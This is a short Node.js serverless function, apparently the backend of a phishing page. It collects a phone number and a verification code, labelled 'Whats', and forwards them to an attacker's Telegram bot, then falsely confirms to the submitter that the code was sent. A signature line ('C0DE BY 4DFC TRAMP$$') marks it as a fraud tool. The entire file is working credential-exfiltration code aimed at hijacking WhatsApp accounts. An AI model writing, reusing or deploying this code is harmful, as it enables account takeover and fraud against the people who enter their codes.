const fetch = require("node-fetch");

exports.handler = async function(event, context) {
  try {
    const data = JSON.parse(event.body);
    const { numero, codigo } = data;
    
    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const mensaje = `Whats\n\n📱 Número: ${numero}\n🔐 Código: ${codigo}\n\nC0DE BY 4DFC TRAMP$$ 👨🏻‍💻🥷🏻`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje
      })
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true, 
        message: "Código enviado correctamente" 
      })
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        error: 'Error interno del servidor' 
      })
    };
  }
};